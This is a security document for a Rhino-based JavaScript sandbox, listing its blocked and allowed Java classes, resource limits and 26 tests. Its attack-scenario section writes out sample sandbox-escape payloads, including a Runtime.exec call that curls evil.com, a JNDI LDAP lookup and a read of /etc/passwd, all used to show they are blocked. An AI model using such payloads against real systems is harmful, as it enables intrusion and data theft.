# JavaScript Sandbox Security

**Last updated**: 2026-03-22 | **Security Audit**: 2026-03-20 | **Tests**: 26/26 passing ✅

**Quick Summary**: Rhino sandbox with ClassShutter blocks System, File I/O, Network, Reflection, Database. 26 automated tests validate all attack vectors.

**Key files**:
- `processor/ScriptProcessor.java:39-147` - ClassShutter implementation (whitelist/blacklist)
- `processor/ScriptProcessor.java:executeScript()` - Timeout & memory enforcement
- `test/java/.../ScriptProcessorSecurityTest.java` - 26 security validation tests

## Test Status: 26/26 Passing ✅

All security controls validated with automated tests. See "Tested Security Controls" section below.

## Overview

The ScriptProcessor uses Mozilla Rhino with a custom ClassShutter to provide a sandboxed JavaScript execution environment. This document details the security mechanisms, tested protections, and known limitations.

## Security Mechanisms

### 1. ClassShutter (Whitelist/Blacklist)
**Location**: `ScriptProcessor.java:39-147`

Uses a hybrid approach:
- **Whitelist**: Explicitly safe classes always allowed
- **Blacklist**: Dangerous classes/packages always blocked
- **Default policy**: Block everything not explicitly allowed

### 2. Timeout Enforcement
- **Default**: 5000ms (5 seconds)
- **Configuration**: `script.timeout` in application.yml
- **Implementation**: Instruction observer checks every 10,000 instructions

### 3. Memory Limit
- **Default**: 52428800 bytes (50 MB)
- **Configuration**: `script.maxMemory` in application.yml
- **Implementation**: Tracks heap growth during execution

### 4. Optimization Level
- **Default**: -1 (interpreted mode)
- **Configuration**: `script.optimizationLevel` in application.yml
- **Reason**: Interpreted mode is slower but safer for untrusted code

## Tested Security Controls

All security controls have been validated with 26 automated tests in `ScriptProcessorSecurityTest.java`.

### ✅ Blocked - System Access

| Attack Vector | Status | Test |
|--------------|--------|------|
| `java.lang.System.exit()` | **BLOCKED** | testSystemClassBlocked |
| `java.lang.Runtime.exec()` | **BLOCKED** | testRuntimeClassBlocked |
| `java.lang.ProcessBuilder` | **BLOCKED** | testProcessBuilderBlocked |
| `java.lang.Thread` | **BLOCKED** | testThreadClassBlocked |
| `java.lang.ClassLoader` | **BLOCKED** | testClassLoaderBlocked |
| `new java.lang.SecurityManager()` | **BLOCKED** | testSecurityManagerBlocked |

### ✅ Blocked - File System Access

| Attack Vector | Status | Test |
|--------------|--------|------|
| `new java.io.File()` | **BLOCKED** | testFileClassBlocked |
| `java.io.FileReader` | **BLOCKED** | testFileReaderBlocked |
| `java.nio.file.Files` | **BLOCKED** | testFilesClassBlocked |

### ✅ Blocked - Network Access

| Attack Vector | Status | Test |
|--------------|--------|------|
| `new java.net.Socket()` | **BLOCKED** | testSocketClassBlocked |
| `new java.net.URL().openConnection()` | **BLOCKED** | testURLClassBlocked |

### ✅ Blocked - Reflection & Code Execution

| Attack Vector | Status | Test |
|--------------|--------|------|
| `java.lang.reflect.*` | **BLOCKED** | testReflectionBlocked |
| `java.lang.invoke.MethodHandles` | **BLOCKED** | testMethodHandlesBlocked |
| `javax.script.ScriptEngineManager` | **BLOCKED** | testScriptEngineBlocked |

### ✅ Blocked - Database Access

| Attack Vector | Status | Test |
|--------------|--------|------|
| `java.sql.DriverManager` | **BLOCKED** | testJDBCBlocked |
| `javax.sql.*` | **BLOCKED** | (via package prefix block) |

### ✅ Blocked - Remote Code Execution Vectors

| Attack Vector | Status | Test |
|--------------|--------|------|
| `javax.naming.InitialContext` (JNDI) | **BLOCKED** | testJNDIBlocked |
| `javax.management.*` (JMX) | **BLOCKED** | testJMXBlocked |

### ✅ Blocked - Internal Classes

| Attack Vector | Status | Test |
|--------------|--------|------|
| `sun.*` packages | **BLOCKED** | testSunClassesBlocked |
| `com.sun.*` packages | **BLOCKED** | (via package prefix block) |
| `jdk.*` packages | **BLOCKED** | testJDKInternalClassesBlocked |

### ✅ Allowed - Safe Utility Classes

| Class | Status | Test |
|-------|--------|------|
| `java.util.ArrayList` | **ALLOWED** | testArrayListAllowed |
| `java.util.HashMap` | **ALLOWED** | testHashMapAllowed |
| `java.util.Date` | **ALLOWED** | testDateAllowed |
| `java.lang.Math` | **ALLOWED** | testMathAllowed |
| `java.time.*` (LocalDate, Instant, etc.) | **ALLOWED** | (via whitelist) |
| `java.math.BigDecimal` | **ALLOWED** | (via whitelist) |

### ✅ Resource Limits Enforced

| Limit | Status | Test |
|-------|--------|------|
| Timeout on infinite loops | **ENFORCED** | testTimeoutEnforcement |
| Memory limit on large allocations | **ENFORCED** | testMemoryLimitEnforcement |

### ✅ Utility Features Work

| Feature | Status | Test |
|---------|--------|------|
| `console.log()` capture | **WORKS** | testConsoleLogCapture |
| Performance metrics tracking | **WORKS** | (integration test) |

## Whitelist Details

### Collections (java.util.*)
```
ArrayList, HashMap, HashSet, LinkedList, TreeMap, TreeSet,
LinkedHashMap, LinkedHashSet, Vector, Stack, Date, UUID,
Optional, Arrays, Collections
```

### Primitives & Wrappers (java.lang.*)
```
String, StringBuilder, StringBuffer, Math, Integer, Long,
Double, Float, Boolean, Character, Byte, Short
```

### Date/Time (java.time.*)
```
LocalDate, LocalDateTime, LocalTime, Instant, Duration,
Period, ZonedDateTime, ZoneId
```

### Math (java.math.*)
```
BigDecimal, BigInteger
```

## Blacklist Details

### Explicitly Blocked Classes
```
java.lang.System
java.lang.Runtime
java.lang.ProcessBuilder
java.lang.Process
java.lang.ClassLoader
java.lang.Thread
java.lang.ThreadGroup
java.lang.SecurityManager
```

### Blocked Package Prefixes
```
java.io.*              (File system access)
java.nio.file.*        (File system access)
java.net.*             (Network access)
java.lang.reflect.*    (Reflection)
java.lang.invoke.*     (Method handles)
javax.script.*         (Script engine access)
sun.*                  (Internal Sun classes)
com.sun.*              (Internal Sun classes)
jdk.*                  (Internal JDK classes)
java.security.*        (Security manager manipulation)
javax.naming.*         (JNDI - RCE vector)
javax.management.*     (JMX - management access)
java.sql.*             (Database access)
javax.sql.*            (Database access)
```

## Default Policy

Classes not in whitelist or blacklist:
- **Allow**: `java.util.*` and `java.lang.*` (if not explicitly blocked)
- **Block**: Everything else by default

## Known Limitations

### 1. Class Reference vs Usage
- **Referencing** a class name (e.g., `java.lang.System`) returns the class object (200 OK)
- **Using** the class (e.g., `java.lang.System.exit()`) is blocked (400 Error)
- This is by design - Rhino's ClassShutter only blocks instantiation and method calls

### 2. Memory Tracking Accuracy
- Memory tracking measures JVM heap growth, including Rhino overhead
- Actual script memory usage may be lower than reported
- Memory limits should be set higher than expected usage

### 3. Timeout Granularity
- Timeout checks occur every 10,000 instructions
- Very fast operations may complete before first check
- Long-running operations are caught reliably

### 4. Java 9+ Module System
- Rhino predates Java modules
- Some internal JDK classes may be accessible via reflection tricks
- Regular updates to Rhino recommended

### 5. No Disk Quota
- Scripts can't access file system directly
- But can consume heap space with large data structures
- Memory limits provide indirect disk quota protection

## Security Best Practices

### For Production Deployment

1. **Run with Security Manager** (optional extra layer):
```bash
java -Djava.security.manager \
     -Djava.security.policy=sandbox.policy \
     -jar servlet-example.jar
```

2. **Set conservative resource limits**:
```yaml
script:
  timeout: 3000              # 3 seconds (stricter than default)
  maxMemory: 10485760        # 10 MB
  optimizationLevel: -1       # Always interpreted mode
```

3. **Monitor execution metrics**:
- Track execution times and memory usage
- Alert on scripts consistently hitting limits
- Review scripts that fail frequently

4. **Rate limiting**:
- Limit script executions per IP/user
- Prevent DoS via script submission spam

5. **Code review for modules**:
- Review all uploaded JavaScript modules
- Modules can import other modules - check dependencies
- No automatic code signing yet

### For Development

1. **Test with malicious scripts**:
```bash
# All 26 security tests
mvn test -Dtest=ScriptProcessorSecurityTest
```

2. **Verify limits locally**:
```bash
# Infinite loop (should timeout)
curl -X POST http://localhost:8080/api/script \
  -H "Content-Type: application/javascript" \
  -d '{"script":"while(true){}"}'

# Memory bomb (should hit limit)
curl -X POST http://localhost:8080/api/script \
  -H "Content-Type: application/javascript" \
  -d '{"script":"var a=[]; while(true) a.push(new java.util.ArrayList())"}'
```

3. **Update Rhino regularly**:
```xml
<dependency>
    <groupId>org.mozilla</groupId>
    <artifactId>rhino</artifactId>
    <version>1.7.15</version> <!-- Check for updates -->
</dependency>
```

## Attack Scenarios Tested

### Scenario 1: File Exfiltration Attempt
**Attack**: `new java.io.FileReader('/etc/passwd')`
**Result**: ❌ Blocked - `java.io.*` package blacklisted

### Scenario 2: Remote Command Execution
**Attack**: `java.lang.Runtime.getRuntime().exec('curl http://evil.com')`
**Result**: ❌ Blocked - `Runtime` class blacklisted

### Scenario 3: JNDI Injection (Log4Shell-style)
**Attack**: `javax.naming.InitialContext().lookup('ldap://evil.com/Exploit')`
**Result**: ❌ Blocked - `javax.naming.*` package blacklisted

### Scenario 4: Reflection-based Bypass
**Attack**: `String.class.getMethod('valueOf', [1]).invoke(null, [42])`
**Result**: ❌ Blocked - `java.lang.reflect.*` package blacklisted

### Scenario 5: Resource Exhaustion
**Attack**: `while(true) { var x = new java.util.ArrayList(); x.add(x); }`
**Result**: ❌ Blocked - Memory limit exceeded after ~50MB

### Scenario 6: Legitimate Usage
**Script**: `var list = new java.util.ArrayList(); list.add('Hello'); list.get(0);`
**Result**: ✅ Allowed - Returns "Hello" successfully

## Reporting Security Issues

If you discover a security vulnerability or sandbox escape:

1. **Do NOT** create a public GitHub issue
2. Email security concerns to: [security contact]
3. Include:
   - Proof-of-concept script
   - Expected vs actual behavior
   - Impact assessment

## Changelog

### 2026-03-20
- ✅ Added 26 automated security tests
- ✅ Verified all major attack vectors blocked
- ✅ Documented ClassShutter implementation
- ✅ Added this security documentation

## References

- **Rhino Security**: https://mozilla.github.io/rhino/
- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **Java Security Manager**: https://docs.oracle.com/en/java/javase/17/security/
- **JNDI Injection**: https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
